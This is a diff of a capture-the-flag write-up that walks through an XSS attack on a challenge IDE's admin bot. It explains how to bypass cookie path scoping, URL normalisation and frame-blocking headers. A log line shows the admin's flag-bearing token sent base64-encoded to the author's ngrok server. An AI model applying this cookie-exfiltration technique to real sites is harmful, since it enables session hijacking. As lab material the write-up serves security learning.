@@ -148,7 +148,11 @@ When we send to the admin we get two hits on our local server:
         X-Forwarded-For: 2600:1900:2001:b:400::1
 ```
 
-It would seem that the headless chrome instance did execute the code, and we got the request for the `/b64/` route, but `document.cookie` was empty.  What gives?  Visiting the exploit url in our own browser and looking in dev tools, even though we've logged in as `guest` there's no cookie.  Lets revisit the server code that sets the cookie
+It would seem that the headless chrome instance did execute the code, and we got the request for the `/b64/` route, but `document.cookie` was empty.  What gives?  Visiting the exploit url in our own browser and looking in dev tools, even though we've logged in as `guest` there's no cookie.
+
+## Adjusting
+
+Lets revisit the server code that sets the cookie
 
 ```js
   return res.cookie('token', `dice{${process.env.FLAG}}`, {
@@ -193,7 +197,11 @@ Aha, it's confined to the `/ide` path.  We can get around this by using a relati
 </html>
 ```
 
-However, we now have a couple more issues to fix.  The browser itself will normalize URLs, and we now have the sandbox page, but if you'll notice, it now has the `x-frame-options: DENY` header.  We can get around the browser normalization by adding in a `%2f` to the path, and we can use `window.open` instead of an iframe.  The final payload looks like the following:
+However, we now have a couple more issues to fix.  The browser itself will normalize URLs, and we now have the sandbox page, but if you'll notice, it now has the `x-frame-options: DENY` header.  We can get around the browser normalization by adding in a `%2f` to the path, and we can use `window.open` instead of an iframe.
+
+## Final Payload
+
+The final payload looks like the following:
 
 ```html
 <script>
@@ -206,7 +214,8 @@ However, we now have a couple more issues to fix.  The browser itself will norma
 </script>
 ```
 
-We send a link to this file, which is hosted via ngrok on our local server.  If everything does to plan, we should get a hit on our local server:
+We send the admin a link to this file, which is hosted via ngrok on our local server.  If everything does to plan, we should get a hit on our local server, and on my [tools server](https://github.com/zoeyg/sec/blob/master/tools/simple-http-server.js) the `/b64/:contents` route decodes contents
+and logs it to stdout:
 
 ```
 22:09:14: GET /b64/dG9rZW49ZGljZXtjMHVsZG43X2YxbmRfNF9iNGNrcjBueW1fZjByXzFkZX0=
